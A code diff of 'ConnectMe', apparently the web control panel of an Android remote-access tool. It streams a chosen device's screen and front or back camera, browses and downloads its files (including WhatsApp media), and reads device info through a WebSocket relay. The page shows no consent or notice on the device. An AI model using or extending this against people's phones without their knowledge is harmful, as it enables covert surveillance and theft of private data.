@@ -7,54 +7,86 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0A0714;color:#fff;font-family:-apple-system,sans-serif;height:100vh;display:flex;flex-direction:column;overflow:hidden}
-.header{background:#110D1E;padding:12px 20px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #2D2A3E;flex-shrink:0}
-.logo{font-size:24px}
-h1{font-size:17px;font-weight:700}
-.badge{font-size:11px;padding:3px 10px;border-radius:12px;background:#1a1a2e;color:#8B949E}
-.badge.on{background:#0d2818;color:#30D158}
-.badge.off{background:#2d0a0a;color:#EF4444}
-.devs{margin-left:auto;display:flex;gap:8px;align-items:center}
-.dev-btn{background:#1E1B2E;border:1px solid #3D3A4E;color:#8B949E;padding:5px 12px;border-radius:8px;cursor:pointer;font-size:12px}
-.dev-btn.active{background:#7C3AED;border-color:#7C3AED;color:#fff}
+
+/* Header */
+.header{background:#110D1E;padding:10px 20px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #2D2A3E;flex-shrink:0}
+.logo{font-size:22px}
+h1{font-size:16px;font-weight:700}
+.relay-status{font-size:11px;padding:3px 10px;border-radius:12px}
+.relay-status.on{background:#0d2818;color:#30D158}
+.relay-status.off{background:#2d0a0a;color:#EF4444}
+
+/* Selector de dispositivos */
+.devices-bar{background:#0D1117;padding:8px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #2D2A3E;flex-shrink:0;overflow-x:auto}
+.devices-label{font-size:11px;color:#8B949E;white-space:nowrap;margin-right:4px}
+.dev-card{display:flex;flex-direction:column;align-items:center;gap:4px;padding:8px 14px;border-radius:10px;border:2px solid #2D2A3E;cursor:pointer;min-width:90px;transition:.2s;background:#110D1E}
+.dev-card:hover{border-color:#7C3AED}
+.dev-card.active{border-color:#7C3AED;background:#1a1040}
+.dev-card.offline{opacity:.4}
+.dev-avatar{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:#fff}
+.dev-name{font-size:11px;color:#E6EDF3;font-weight:600}
+.dev-ping{font-size:10px}
+.dev-ping.on{color:#30D158}
+.dev-ping.off{color:#EF4444}
+.no-devices{font-size:12px;color:#4B5563;padding:8px}
+
+/* Layout principal */
 .main{display:flex;flex:1;overflow:hidden}
-.sidebar{width:160px;background:#110D1E;border-right:1px solid #2D2A3E;display:flex;flex-direction:column;flex-shrink:0}
-.tab{padding:12px 16px;cursor:pointer;font-size:13px;color:#8B949E;border-left:3px solid transparent}
+.sidebar{width:150px;background:#110D1E;border-right:1px solid #2D2A3E;display:flex;flex-direction:column;flex-shrink:0}
+.tab{padding:11px 14px;cursor:pointer;font-size:13px;color:#8B949E;border-left:3px solid transparent}
 .tab:hover{color:#fff;background:#1a1629}
 .tab.active{color:#fff;border-left-color:#7C3AED;background:#1a1629}
 .content{flex:1;overflow:hidden;display:flex;flex-direction:column}
 .panel{display:none;flex:1;flex-direction:column;overflow:hidden}
 .panel.active{display:flex}
-.stream-area{flex:1;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
-.stream-area img{max-width:100%;max-height:100%;object-fit:contain}
-.no-signal{color:#333;font-size:14px;text-align:center}
-.controls{background:#110D1E;padding:10px 16px;display:flex;gap:8px;border-top:1px solid #2D2A3E;flex-shrink:0;flex-wrap:wrap}
-.btn{background:#1E1B2E;border:1px solid #3D3A4E;color:#fff;padding:7px 14px;border-radius:8px;cursor:pointer;font-size:13px;white-space:nowrap}
+
+/* Stream */
+.stream-area{flex:1;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.stream-area img{max-width:100%;max-height:100%;object-fit:contain;display:block}
+.no-signal{color:#333;font-size:13px;text-align:center;line-height:2}
+
+/* Controls */
+.controls{background:#110D1E;padding:8px 14px;display:flex;gap:6px;border-top:1px solid #2D2A3E;flex-shrink:0;flex-wrap:wrap}
+.btn{background:#1E1B2E;border:1px solid #3D3A4E;color:#fff;padding:6px 12px;border-radius:7px;cursor:pointer;font-size:12px;white-space:nowrap}
 .btn:hover{background:#2D2A3E}
-.btn.primary{background:#7C3AED;border-color:#7C3AED}
-.btn.danger{background:#DC2626;border-color:#DC2626}
-.btn.success{background:#16a34a;border-color:#16a34a}
-.files{flex:1;overflow-y:auto;padding:8px}
-.file{display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:6px;cursor:pointer}
+.btn.g{background:#16a34a;border-color:#16a34a}
+.btn.r{background:#DC2626;border-color:#DC2626}
+.btn.p{background:#7C3AED;border-color:#7C3AED}
+
+/* Archivos */
+.files{flex:1;overflow-y:auto;padding:4px 8px}
+.file{display:flex;align-items:center;gap:10px;padding:8px 10px;border-radius:6px;cursor:pointer}
 .file:hover{background:#1a1629}
-.fname{flex:1;font-size:13px}
-.fsize{font-size:11px;color:#8B949E}
-.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:20px;overflow-y:auto}
-.card{background:#110D1E;border:1px solid #2D2A3E;border-radius:10px;padding:14px}
-.clabel{font-size:10px;color:#8B949E;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px}
-.cval{font-size:15px;font-weight:600}
-.empty{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:12px;color:#8B949E}
+.fname{flex:1;font-size:13px;word-break:break-all}
+.fsize{font-size:10px;color:#8B949E;white-space:nowrap}
+
+/* Info */
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:16px;overflow-y:auto}
+.card{background:#110D1E;border:1px solid #2D2A3E;border-radius:10px;padding:12px}
+.clabel{font-size:10px;color:#8B949E;text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px}
+.cval{font-size:14px;font-weight:600}
+
+.empty{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:10px;color:#8B949E;font-size:13px}
 </style>
 </head>
 <body>
+
+<!-- Header -->
 <div class="header">
   <div class="logo">∞</div>
   <h1>ConnectMe</h1>
-  <span class="badge off" id="relayStatus">Desconectado</span>
-  <div class="devs" id="devList">
-    <span style="font-size:12px;color:#8B949E">Sin dispositivos</span>
+  <span class="relay-status off" id="relayStatus">Desconectado</span>
+</div>
+
+<!-- Selector de dispositivos -->
+<div class="devices-bar">
+  <span class="devices-label">📱 Dispositivos:</span>
+  <div id="devCards" style="display:flex;gap:8px">
+    <span class="no-devices">Esperando dispositivos...</span>
   </div>
 </div>
 
+<!-- Main -->
 <div class="main">
   <div class="sidebar">
     <div class="tab active" onclick="showTab('screen')">🖥️ Pantalla</div>
@@ -67,139 +99,187 @@ h1{font-size:17px;font-weight:700}
     <!-- Pantalla -->
     <div class="panel active" id="panelScreen">
       <div class="stream-area" id="screenArea">
-        <div class="no-signal">📵<br><br>Pulsa Iniciar para ver la pantalla</div>
+        <div class="no-signal">🖥️<br>Selecciona un dispositivo<br>y pulsa ▶ Iniciar</div>
       </div>
       <div class="controls">
-        <button class="btn success" onclick="startStream('screen')">▶ Iniciar</button>
-        <button class="btn danger"  onclick="stopStream('screen')">⏹ Detener</button>
-        <button class="btn" onclick="cmd('home')">⌂ Inicio</button>
-        <button class="btn" onclick="cmd('back')">← Atrás</button>
-        <button class="btn" onclick="cmd('recents')">▣ Recientes</button>
+        <button class="btn g" onclick="startStream('screen')">▶ Iniciar</button>
+        <button class="btn r" onclick="stopStream('screen')">⏹ Detener</button>
+        <button class="btn" onclick="cmd('home')">⌂</button>
+        <button class="btn" onclick="cmd('back')">←</button>
+        <button class="btn" onclick="cmd('recents')">▣</button>
       </div>
     </div>
 
     <!-- Cámara -->
     <div class="panel" id="panelCamera">
       <div class="stream-area" id="cameraArea">
-        <div class="no-signal">📷<br><br>Pulsa Frontal o Trasera para ver</div>
+        <div class="no-signal">📷<br>Selecciona un dispositivo<br>y elige la cámara</div>
       </div>
       <div class="controls">
-        <button class="btn success" onclick="startStream('cam_front')">📱 Frontal</button>
-        <button class="btn success" onclick="startStream('cam_back')">📸 Trasera</button>
-        <button class="btn danger"  onclick="stopStream('camera')">⏹ Detener</button>
+        <button class="btn g" onclick="startStream('cam_front')">📱 Frontal</button>
+        <button class="btn g" onclick="startStream('cam_back')">📸 Trasera</button>
+        <button class="btn r" onclick="stopStream('camera')">⏹ Detener</button>
       </div>
     </div>
 
     <!-- Archivos -->
     <div class="panel" id="panelFiles">
       <div class="controls">
-        <button class="btn" onclick="listFiles('/')">/ Raíz</button>
         <button class="btn" onclick="listFiles('/sdcard')">📱 Interno</button>
         <button class="btn" onclick="listFiles('/sdcard/DCIM')">📷 DCIM</button>
         <button class="btn" onclick="listFiles('/sdcard/Download')">⬇️ Descargas</button>
         <button class="btn" onclick="listFiles('/sdcard/WhatsApp/Media')">💬 WhatsApp</button>
+        <button class="btn" onclick="listFiles('/')">/ Raíz</button>
       </div>
       <div class="files" id="fileList">
-        <div class="empty"><span style="font-size:40px">📁</span>Selecciona una carpeta</div>
+        <div class="empty"><span style="font-size:36px">📁</span>Selecciona una carpeta</div>
       </div>
     </div>
 
     <!-- Info -->
     <div class="panel" id="panelInfo">
       <div class="controls">
-        <button class="btn primary" onclick="cmd('info')">🔄 Actualizar</button>
+        <button class="btn p" onclick="cmd('info')">🔄 Actualizar</button>
       </div>
       <div class="info-grid" id="infoGrid">
-        <div class="empty"><span style="font-size:40px">📱</span>Pulsa Actualizar</div>
+        <div class="empty" style="grid-column:1/-1"><span style="font-size:36px">📱</span>Pulsa Actualizar</div>
       </div>
     </div>
   </div>
 </div>
 
 <script>
-let ws, activeDevice = null;
-let screenInterval = null, camInterval = null;
-let currentStream = null;
+// Estado
+let ws;
+const devices = {};   // deviceId → { name, online, color }
+let activeDevice = null;
+let screenInt = null, camInt = null;
 
+const COLORS = ['#7C3AED','#0EA5E9','#16a34a','#DC2626','#f59e0b','#ec4899'];
+let colorIdx = 0;
+
+// ── WebSocket ────────────────────────────────────────────────────────────────
 function connect() {
   const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
   ws = new WebSocket(`${proto}//${location.host}`);
   ws.binaryType = 'arraybuffer';
 
   ws.onopen = () => {
-    setStatus(true);
-    ws.send(JSON.stringify({ type: 'register', role: 'panel' }));
+    setRelayStatus(true);
+    ws.send(JSON.stringify({ type:'register', role:'panel' }));
   };
-  ws.onclose = () => { setStatus(false); setTimeout(connect, 3000); };
+  ws.onclose = () => { setRelayStatus(false); setTimeout(connect, 3000); };
 
   ws.onmessage = (e) => {
+    // Frame binario → mostrar en panel activo
     if (e.data instanceof ArrayBuffer) {
-      // Frame binario — mostrar en el área activa
-      const blob = new Blob([e.data], { type: 'image/jpeg' });
+      const blob = new Blob([e.data], { type:'image/jpeg' });
       const url  = URL.createObjectURL(blob);
       const area = document.querySelector('.panel.active .stream-area');
       if (!area) return;
       let img = area.querySelector('img');
-      if (!img) { area.innerHTML = ''; img = document.createElement('img'); area.appendChild(img); }
-      URL.revokeObjectURL(img.src);
-      img.src = url;
+      if (!img) { area.innerHTML=''; img=document.createElement('img'); area.appendChild(img); }
+      URL.revokeObjectURL(img.src); img.src = url;
       return;
     }
     try {
       const msg = JSON.parse(e.data);
-      if (msg.type === 'device_connected') addDevice(msg.deviceId);
-      if (msg.type === 'device_disconnected') removeDevice(msg.deviceId);
-      if (msg.type === 'device_list') msg.devices.forEach(addDevice);
-      if (msg.type === 'files') renderFiles(msg.data, msg.path);
-      if (msg.type === 'info')  renderInfo(msg.data);
+      if (msg.type === 'device_list')         msg.devices.forEach(id => addDevice(id));
+      if (msg.type === 'device_connected')    addDevice(msg.deviceId);
+      if (msg.type === 'device_disconnected') setDeviceOffline(msg.deviceId);
+      if (msg.type === 'files')  renderFiles(msg.data);
+      if (msg.type === 'info')   renderInfo(msg.data);
     } catch(e) {}
   };
 }
 
+// ── Dispositivos ──────────────────────────────────────────────────────────────
+function addDevice(id) {
+  if (!id) return;
+  if (!devices[id]) {
+    devices[id] = { color: COLORS[colorIdx++ % COLORS.length], online: true };
+  } else {
+    devices[id].online = true;
+  }
+  if (!activeDevice) selectDevice(id);
+  renderDeviceBar();
+}
+
+function setDeviceOffline(id) {
+  if (devices[id]) { devices[id].online = false; renderDeviceBar(); }
+  if (activeDevice === id) stopAllStreams();
+}
+
+function selectDevice(id) {
+  activeDevice = id;
+  stopAllStreams();
+  renderDeviceBar();
+  // Resetear áreas
+  document.getElementById('screenArea').innerHTML = '<div class="no-signal">🖥️<br>Pulsa ▶ Iniciar</div>';
+  document.getElementById('cameraArea').innerHTML = '<div class="no-signal">📷<br>Elige la cámara</div>';
+}
+
+function renderDeviceBar() {
+  const container = document.getElementById('devCards');
+  const ids = Object.keys(devices);
+  if (!ids.length) {
+    container.innerHTML = '<span class="no-devices">Esperando dispositivos...</span>';
+    return;
+  }
+  container.innerHTML = ids.map(id => {
+    const d = devices[id];
+    const isActive = id === activeDevice;
+    return `
+      <div class="dev-card ${isActive?'active':''} ${d.online?'':'offline'}"
+           onclick="selectDevice('${id}')">
+        <div class="dev-avatar" style="background:${d.color}">${id.slice(0,2).toUpperCase()}</div>
+        <div class="dev-name">${id.slice(0,8)}</div>
+        <div class="dev-ping ${d.online?'on':'off'}">${d.online?'● Online':'● Offline'}</div>
+      </div>`;
+  }).join('');
+}
+
+// ── Comandos ──────────────────────────────────────────────────────────────────
 function cmd(action, extra={}) {
-  if (!ws || ws.readyState !== 1 || !activeDevice) return;
-  ws.send(JSON.stringify({ type:'cmd', action, deviceId: activeDevice, ...extra }));
+  if (!ws || ws.readyState !== 1) return;
+  if (!activeDevice) { alert('Selecciona un dispositivo primero'); return; }
+  ws.send(JSON.stringify({ type:'cmd', action, deviceId:activeDevice, ...extra }));
 }
 
 function startStream(type) {
   stopAllStreams();
-  currentStream = type;
   if (type === 'screen') {
     cmd('screen_start');
-    screenInterval = setInterval(() => cmd('screen_frame'), 300);
+    screenInt = setInterval(() => cmd('screen_frame'), 250);
   } else if (type === 'cam_front') {
-    cmd('cam_start', { lens: 1 });
-    camInterval = setInterval(() => cmd('cam_frame'), 300);
+    cmd('cam_start', { lens:1 });
+    camInt = setInterval(() => cmd('cam_frame'), 250);
   } else if (type === 'cam_back') {
-    cmd('cam_start', { lens: 0 });
-    camInterval = setInterval(() => cmd('cam_frame'), 300);
+    cmd('cam_start', { lens:0 });
+    camInt = setInterval(() => cmd('cam_frame'), 250);
   }
 }
 
 function stopStream(type) {
   stopAllStreams();
-  if (type === 'screen') { cmd('screen_stop'); resetArea('screenArea'); }
-  if (type === 'camera') { cmd('cam_stop');    resetArea('cameraArea'); }
+  if (type === 'screen') { cmd('screen_stop'); document.getElementById('screenArea').innerHTML='<div class="no-signal">🖥️<br>Stream detenido</div>'; }
+  if (type === 'camera') { cmd('cam_stop');    document.getElementById('cameraArea').innerHTML='<div class="no-signal">📷<br>Stream detenido</div>'; }
 }
 
 function stopAllStreams() {
-  clearInterval(screenInterval); clearInterval(camInterval);
-  screenInterval = null; camInterval = null;
-}
-
-function resetArea(id) {
-  const area = document.getElementById(id);
-  if (area) area.innerHTML = '<div class="no-signal">📵<br><br>Stream detenido</div>';
+  clearInterval(screenInt); clearInterval(camInt);
+  screenInt = null; camInt = null;
 }
 
 function listFiles(path) { cmd('list_files', { path }); }
 
-function renderFiles(files, path) {
+// ── Renderizado ───────────────────────────────────────────────────────────────
+function renderFiles(files) {
   const el = document.getElementById('fileList');
-  if (!files?.length) { el.innerHTML = '<div class="empty"><span style="font-size:40px">📭</span>Carpeta vacía</div>'; return; }
-  el.innerHTML = files.map(f => `
-    <div class="file" onclick="${f.isDir ? `listFiles('${f.path}')` : `cmd('download',{path:'${f.path}'})`}">
-      <span style="font-size:18px">${f.isDir?'📁':icon(f.name)}</span>
+  if (!files?.length) { el.innerHTML='<div class="empty"><span style="font-size:36px">📭</span>Carpeta vacía</div>'; return; }
+  el.innerHTML = files.map(f=>`
+    <div class="file" onclick="${f.isDir?`listFiles('${f.path}')`:`cmd('download',{path:'${f.path}'})`}">
+      <span style="font-size:17px">${f.isDir?'📁':icon(f.name)}</span>
       <span class="fname">${f.name}</span>
       <span class="fsize">${f.isDir?'':fmt(f.size)}</span>
     </div>`).join('');
@@ -211,38 +291,19 @@ function renderInfo(d) {
     <div class="card"><div class="clabel">${k}</div><div class="cval">${v}</div></div>`).join('');
 }
 
-function addDevice(id) {
-  if (!id) return;
-  if (!activeDevice) { activeDevice = id; }
-  const list = document.getElementById('devList');
-  if (!document.getElementById('d_'+id)) {
-    list.innerHTML = '';
-    const btn = document.createElement('button');
-    btn.className = 'dev-btn' + (id === activeDevice ? ' active' : '');
-    btn.id = 'd_'+id;
-    btn.textContent = '📱 ' + id.slice(0,6);
-    btn.onclick = () => { activeDevice = id; document.querySelectorAll('.dev-btn').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); };
-    list.appendChild(btn);
-  }
-}
-
-function removeDevice(id) {
-  document.getElementById('d_'+id)?.remove();
-  if (activeDevice === id) { activeDevice = null; stopAllStreams(); }
-}
-
 function showTab(name) {
-  document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['screen','camera','files','info'][i]===name));
+  document.querySelectorAll('.tab').forEach((t,i)=>
+    t.classList.toggle('active',['screen','camera','files','info'][i]===name));
   document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
   document.getElementById('panel'+name[0].toUpperCase()+name.slice(1))?.classList.add('active');
   stopAllStreams();
-  if (name === 'info') cmd('info');
+  if (name==='info') cmd('info');
 }
 
-function setStatus(on) {
+function setRelayStatus(on) {
   const el = document.getElementById('relayStatus');
   el.textContent = on ? '● Conectado' : '● Desconectado';
-  el.className = 'badge ' + (on ? 'on' : 'off');
+  el.className = 'relay-status ' + (on?'on':'off');
 }
 
 function icon(n) {
